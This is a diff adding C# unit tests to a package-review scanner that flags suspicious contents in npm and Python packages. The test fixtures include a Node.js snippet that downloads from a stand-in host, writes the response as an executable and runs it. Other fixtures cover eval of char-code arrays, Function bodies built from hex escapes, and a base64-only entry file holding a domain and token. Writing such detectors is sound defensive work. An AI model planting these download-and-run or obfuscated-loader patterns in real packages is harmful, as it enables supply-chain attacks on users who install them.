@@ -2263,6 +2263,17 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void An_only_entry_file_of_one_base64_literal_decoding_to_settings_is_noteworthy()
+    {
+        var encoded = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("""{"domain":"https://example.invalid","token":"x","interval":30000,"retry":3}"""));
+        var r = Review(Tgz("config-1.0.0.tgz", ("package/package.json", """{"name":"config-loader","version":"1.0.0"}"""), ("package/index.js", encoded + "\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/carrier", Level: "noteworthy", Path: "package/index.js" });
+        var noise = Convert.ToBase64String(Enumerable.Range(0, 90).Select(i => (byte)(i * 7)).ToArray());
+        Assert.DoesNotContain(Review(Tgz("config-1.0.1.tgz", ("package/package.json", """{"name":"config-loader","version":"1.0.1"}"""), ("package/index.js", noise))).Findings,
+            f => f.Rule == "package/carrier");
+    }
+
+    [Fact]
     public void A_global_prefix_passed_through_a_function_to_a_link_under_bin_is_noteworthy_at_install()
     {
         var r = Review(Tgz("post-1.0.0.tgz",
@@ -2304,6 +2315,38 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("noteworthy", PackageReview.Scan("setup.py", code, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
         const string plain = "import socket\nname = settings.bucket\nd = name + '.example.invalid'\nsocket.gethostbyname(d)\n";
         Assert.Equal("review", PackageReview.Scan("client.py", plain, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+    }
+
+    [Fact]
+    public void A_response_written_with_an_executable_mode_and_run_by_its_path_is_noteworthy()
+    {
+        const string code = "const https = require('https'), fs = require('fs'), path = require('path'), cp = require('child_process');\n" +
+            "https.request({ host: 'example.invalid' }, res => {\n  let body = [];\n  res.on('data', c => body.push(c));\n  res.on('end', () => {\n" +
+            "    const p = path.join(require('os').tmpdir(), 'tool');\n    fs.writeFileSync(p, Buffer.concat(body), { mode: 0o775 });\n    cp.exec(path.join(p));\n  });\n}).end();";
+        Assert.Contains(PackageReview.Scan("dist/extension.js", code, install: false, default, peel: false), f => f is { Rule: "package/download-and-run", Level: "noteworthy" });
+        var data = code.Replace("{ mode: 0o775 }", "'utf8'", StringComparison.Ordinal);
+        Assert.DoesNotContain(PackageReview.Scan("dist/extension.js", data, install: false, default, peel: false), f => f.Rule == "package/download-and-run");
+    }
+
+    [Fact]
+    public void A_function_body_literal_of_escapes_is_transformed_code_and_a_short_one_is_not()
+    {
+        var body = string.Concat(Enumerable.Repeat("\\x76\\x61\\x72\\x20\\x61\\x3d\\x31\\x3b", 10));
+        var r = Review(Tgz("load-1.0.0.tgz", ("package/package.json", """{"name":"loader-demo","version":"1.0.0","main":"dist/load.cjs"}"""),
+            ("package/dist/load.cjs", "module.exports = Function(\"a\", \"" + body + "\");"), ("package/dist/app.jsc", "\u0001\u0002\u0003")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/string-array", Level: "noteworthy", Path: "package/dist/load.cjs" });
+        Assert.DoesNotContain(PackageReview.Scan("load.cjs", "module.exports = Function(\"a\", \"\x76\x61\x72 a = 1; return a;\");", install: false, default, peel: false),
+            f => f.Rule == "package/string-array");
+    }
+
+    [Fact]
+    public void Eval_of_an_integer_array_mapped_through_from_char_code_is_noteworthy()
+    {
+        var codes = string.Join(",", "console.log(1);".Select(c => (int)c).Concat(Enumerable.Repeat(32, 200)));
+        var code = "function decode(s, k) { return s; }\neval(decode([" + codes + "].map(function(c){return String.fromCharCode(c)}).join(''), 3));";
+        Assert.Contains(PackageReview.Scan("_data.js", code, install: false, default, peel: false), f => f is { Rule: "package/exec-char-codes", Level: "noteworthy" });
+        var shown = "const label = [72,105,32,116,104,101,114,101,33,32,72,105,32,116,104,101,114,101,33,32].map(c => String.fromCharCode(c)).join('');";
+        Assert.DoesNotContain(PackageReview.Scan("label.js", shown, install: false, default, peel: false), f => f.Rule == "package/exec-char-codes");
     }
 
     [Fact]
